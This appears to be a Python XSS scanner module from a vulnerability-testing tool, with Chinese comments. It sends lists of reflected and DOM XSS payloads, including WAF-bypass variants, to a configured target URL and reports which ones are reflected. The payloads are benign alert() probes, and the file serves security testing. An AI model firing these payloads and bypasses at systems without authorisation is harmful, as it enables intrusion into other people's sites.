"""
XSS 检测技能
支持反射型、存储型和 DOM 型 XSS，覆盖多种注入上下文
"""
import html
import json
import os
import re
import sys
import time
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import parse_qs, quote, urlencode, urlparse, urlunparse

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


class XSSDetector:
    """XSS 漏洞检测器"""

    # 唯一标记用于检测回显
    MARKER = "VULNFLOW_XSS_MARKER"

    # HTML 上下文 Payload
    HTML_PAYLOADS = [
        f'<script>alert("{MARKER}")</script>',
        f'<img src=x onerror=alert("{MARKER}")>',
        f'<svg onload=alert("{MARKER}")>',
        f'<body onload=alert("{MARKER}")>',
        f'<iframe src="javascript:alert(\'{MARKER}\')">',
        f'<details open ontoggle=alert("{MARKER}")>',
        f'<marquee onstart=alert("{MARKER}")>',
        f'<video><source onerror=alert("{MARKER}")>',
    ]

    # 属性上下文 Payload
    ATTRIBUTE_PAYLOADS = [
        f'" onmouseover=alert("{MARKER}") x="',
        f"' onmouseover=alert('{MARKER}') x='",
        f'" onfocus=alert("{MARKER}") autofocus x="',
        f"' onfocus=alert('{MARKER}') autofocus x='",
        f'" onclick=alert("{MARKER}") x="',
        f'" onload=alert("{MARKER}") x="',
        f'` onmouseover=alert("{MARKER}") x=`',
        f'" autofocus onfocus=alert("{MARKER}") x="',
        f'"><script>alert("{MARKER}")</script>',
        f"'><script>alert('{MARKER}')</script>",
    ]

    # JavaScript 上下文 Payload
    JS_PAYLOADS = [
        f'";alert("{MARKER}")//',
        f"';alert('{MARKER}')//",
        f'";alert("{MARKER}");var x="',
        f"';alert('{MARKER}');var x='",
        f"</script><script>alert('{MARKER}')</script>",
        f"'-alert('{MARKER}')-'",
        f'"-alert("{MARKER}")-"',
        f"\\';alert('{MARKER}')//",
        f'\\";alert("{MARKER}")//',
        f"</script><img src=x onerror=alert('{MARKER}')>",
        f"};alert('{MARKER}');//",
        f");alert('{MARKER}');//",
    ]

    # CSS 上下文 Payload
    CSS_PAYLOADS = [
        f"</style><script>alert('{MARKER}')</script>",
        f"background-image:url(javascript:alert('{MARKER}'))",
        f"</style><img src=x onerror=alert('{MARKER}')>",
        f"@import 'javascript:alert(\"{MARKER}\")';",
        f"expression(alert('{MARKER}'))",
    ]

    # URL 上下文 Payload
    URL_PAYLOADS = [
        f"javascript:alert('{MARKER}')",
        f"data:text/html,<script>alert('{MARKER}')</script>",
        f"javascript:void(alert('{MARKER}'))",
    ]

    # WAF 绕过变体
    WAF_BYPASS_PAYLOADS = [
        # 大小写变体
        f'<ScRiPt>alert("{MARKER}")</ScRiPt>',
        f'<sCript>alert("{MARKER}")</sCript>',
        # 编码变体
        f'<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(&#39;{MARKER}&#39;)">',
        # 空格替换
        f'<img/src=x/onerror=alert("{MARKER}")>',
        f'<svg/onload=alert("{MARKER}")>',
        # 空字节
        f'<script%00>alert("{MARKER}")</script>',
        # 注释混淆
        f'<script>/**/alert("{MARKER}")/**/</script>',
        # 协议混淆
        f'<img src=java&#115;cript:alert("{MARKER}")>',
        # 换行
        f'<img src=x\nonerror=alert("{MARKER}")>',
        # HTML 实体
        f'<img src=x onerror="&#x61;lert(&apos;{MARKER}&apos;)">',
    ]

    def __init__(self, config: Dict[str, Any]):
        self.target_url = config["target_url"]
        self.method = config.get("method", "GET").upper()
        self.parameters = config.get("parameters", [])
        self.headers = config.get("headers", {})
        self.cookies = config.get("cookies", {})
        self.test_types = config.get("test_types", ["reflected"])
        self.contexts = config.get("contexts", ["html", "attribute", "javascript"])
        self.waf_bypass = config.get("waf_bypass", True)
        self.delay = config.get("delay", 0.3)
        self.timeout = config.get("timeout", 10)
        self.proxy = config.get("proxy")

        self.session = self._create_session()
        self.findings: List[Dict[str, Any]] = []
        self.request_count = 0

    def _create_session(self) -> requests.Session:
        """创建 HTTP 会话"""
        session = requests.Session()

        retry_strategy = Retry(total=2, backoff_factor=0.3, status_forcelist=[429, 500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)

        default_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
        }
        session.headers.update(default_headers)

        if self.headers:
            session.headers.update(self.headers)
        if self.cookies:
            session.cookies.update(self.cookies)
        if self.proxy:
            session.proxies = {"http": self.proxy, "https": self.proxy}

        return session

    def _extract_parameters(self, url: str) -> List[Tuple[str, str]]:
        """从 URL 提取参数"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return [(k, v[0]) for k, v in params.items()]

    def _build_test_url(self, param: str, payload: str) -> str:
        """构建测试 URL"""
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _send_request(
        self, url: str, data: Optional[Dict] = None
    ) -> Optional[requests.Response]:
        """发送 HTTP 请求"""
        if self.request_count >= 200:
            return None

        self.request_count += 1

        try:
            if self.method == "GET":
                resp = self.session.get(url, timeout=self.timeout, allow_redirects=False)
            else:
                resp = self.session.post(url, data=data, timeout=self.timeout, allow_redirects=False)
            return resp
        except Exception:
            return None

    def _is_reflected(self, response_text: str, payload: str) -> Tuple[bool, str]:
        """检查 payload 是否在响应中回显"""
        # 直接检查 payload 是否在响应中
        if payload in response_text:
            return True, "payload 在响应中原样回显"

        # 检查 HTML 解码后的 payload
        decoded_response = html.unescape(response_text)
        if payload in decoded_response:
            return True, "payload 在 HTML 解码后回显"

        # 检查部分 payload
        if self.MARKER in response_text or self.MARKER in decoded_response:
            return True, f"检测到标记 {self.MARKER}"

        # 检查关键特征
        key_parts = ["<script>", "onerror=", "onload=", "javascript:", "alert("]
        for part in key_parts:
            if part in response_text.lower():
                # 进一步确认
                if part in response_text:
                    return True, f"检测到 XSS 特征: {part}"

        return False, ""

    def _analyze_context(self, response_text: str, payload: str) -> str:
        """分析 payload 在响应中的注入上下文"""
        if payload not in response_text:
            return "unknown"

        idx = response_text.index(payload)

        # 获取周围上下文
        start = max(0, idx - 100)
        end = min(len(response_text), idx + len(payload) + 100)
        surrounding = response_text[start:end].lower()

        # 判断上下文
        if "<script" in surrounding:
            return "javascript"
        elif "<style" in surrounding:
            return "css"
        elif 'href="' in surrounding or 'href=\'' in surrounding:
            return "url"
        elif '="' in surrounding or "='" in surrounding:
            return "attribute"
        else:
            return "html"

    def _test_reflected_xss(
        self, param: str, context: str
    ) -> List[Dict[str, Any]]:
        """检测反射型 XSS"""
        results = []

        # 根据上下文选择 payload
        if context == "html":
            payloads = self.HTML_PAYLOADS
        elif context == "attribute":
            payloads = self.ATTRIBUTE_PAYLOADS
        elif context == "javascript":
            payloads = self.JS_PAYLOADS
        elif context == "css":
            payloads = self.CSS_PAYLOADS
        elif context == "url":
            payloads = self.URL_PAYLOADS
        else:
            payloads = self.HTML_PAYLOADS + self.ATTRIBUTE_PAYLOADS

        # 加入 WAF 绕过 payload
        if self.waf_bypass:
            payloads = list(payloads) + self.WAF_BYPASS_PAYLOADS

        for payload in payloads:
            test_url = self._build_test_url(param, payload)
            resp = self._send_request(test_url)

            if resp is None:
                continue

            reflected, evidence = self._is_reflected(resp.text, payload)

            if reflected:
                actual_context = self._analyze_context(resp.text, payload)

                # 判断严重程度
                if actual_context in ("javascript", "html"):
                    severity = "high"
                elif actual_context == "attribute":
                    severity = "medium"
                elif actual_context == "url":
                    severity = "medium"
                else:
                    severity = "low"

                results.append(
                    {
                        "type": "reflected",
                        "url": test_url,
                        "parameter": param,
                        "payload": payload,
                        "evidence": evidence,
                        "severity": severity,
                        "context": actual_context,
                        "details": {
                            "response_status": resp.status_code,
                            "response_length": len(resp.text),
                            "targeted_context": context,
                            "actual_context": actual_context,
                            "waf_bypass_attempt": payload in self.WAF_BYPASS_PAYLOADS,
                        },
                    }
                )
                break  # 每个上下文找到一个即可

            time.sleep(self.delay)

        return results

    def _test_dom_xss(self, param: str) -> List[Dict[str, Any]]:
        """检测潜在的 DOM 型 XSS"""
        results = []

        # DOM XSS 源点检测
        dom_sources = [
            "document.write",
            "document.writeln",
            "innerHTML",
            "outerHTML",
            "insertAdjacentHTML",
            "eval",
            "setTimeout",
            "setInterval",
            "Function",
            "location",
            "location.href",
            "location.hash",
            "location.search",
            "document.URL",
            "document.documentURI",
            "document.baseURI",
        ]

        # 发送简单 payload 检测 DOM 操作
        test_payload = f'"><script>console.log("{self.MARKER}")</script>'
        test_url = self._build_test_url(param, test_payload)
        resp = self._send_request(test_url)

        if resp is None:
            return results

        response_text = resp.text.lower()

        # 检测是否存在 DOM XSS 源点
        for source in dom_sources:
            if source.lower() in response_text:
                # 检测是否同时存在用户输入控制
                input_patterns = [
                    "location.search",
                    "location.hash",
                    "document.referrer",
                    "window.name",
                ]
                has_input = any(p in response_text for p in input_patterns)

                if has_input:
                    results.append(
                        {
                            "type": "dom",
                            "url": self.target_url,
                            "parameter": param,
                            "payload": test_payload,
                            "evidence": f"检测到潜在 DOM XSS 源点: {source}",
                            "severity": "medium",
                            "context": "javascript",
                            "details": {
                                "dom_source": source,
                                "response_status": resp.status_code,
                                "response_length": len(resp.text),
                            },
                        }
                    )
                    break

        return results

    def detect(self) -> Dict[str, Any]:
        """执行 XSS 检测"""
        start_time = time.time()

        # 提取参数
        if not self.parameters:
            self.parameters = [p[0] for p in self._extract_parameters(self.target_url)]

        if not self.parameters:
            return {
                "findings": [],
                "summary": {
                    "total_findings": 0,
                    "by_type": {},
                    "by_context": {},
                    "by_severity": {},
                    "total_requests": 0,
                    "duration_seconds": 0,
                    "error": "未找到可测试的参数",
                },
            }

        # 执行检测
        for param in self.parameters:
            if "reflected" in self.test_types:
                for context in self.contexts:
                    self.findings.extend(self._test_reflected_xss(param, context))

            if "dom" in self.test_types:
                self.findings.extend(self._test_dom_xss(param))

        # 统计
        by_type: Dict[str, int] = {}
        by_context: Dict[str, int] = {}
        by_severity: Dict[str, int] = {}

        for finding in self.findings:
            t = finding.get("type", "unknown")
            by_type[t] = by_type.get(t, 0) + 1

            c = finding.get("context", "unknown")
            by_context[c] = by_context.get(c, 0) + 1

            s = finding.get("severity", "info")
            by_severity[s] = by_severity.get(s, 0) + 1

        duration = round(time.time() - start_time, 2)

        return {
            "findings": self.findings,
            "summary": {
                "total_findings": len(self.findings),
                "by_type": by_type,
                "by_context": by_context,
                "by_severity": by_severity,
                "total_requests": self.request_count,
                "duration_seconds": duration,
            },
        }


def main():
    """主入口"""
    input_path = "/input/input.json"
    output_path = "/output/results.json"

    try:
        with open(input_path, "r", encoding="utf-8") as f:
            config = json.load(f)

        if "target_url" not in config:
            raise ValueError("缺少必填字段: target_url")

        detector = XSSDetector(config)
        results = detector.detect()

        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        with open(output_path, "w", encoding="utf-8") as f:
            json.dump(results, f, ensure_ascii=False, indent=2)

        summary = results["summary"]
        print(f"[完成] XSS 检测完成")
        print(f"  - 发现漏洞: {summary['total_findings']} 个")
        print(f"  - 按类型: {summary['by_type']}")
        print(f"  - 按严重程度: {summary['by_severity']}")
        print(f"  - 总请求数: {summary['total_requests']}")
        print(f"  - 耗时: {summary['duration_seconds']} 秒")

        sys.exit(0)

    except FileNotFoundError:
        print(f"[错误] 输入文件不存在: {input_path}", file=sys.stderr)
        sys.exit(1)
    except json.JSONDecodeError as e:
        print(f"[错误] JSON 解析失败: {e}", file=sys.stderr)
        sys.exit(1)
    except Exception as e:
        print(f"[错误] 检测过程异常: {e}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
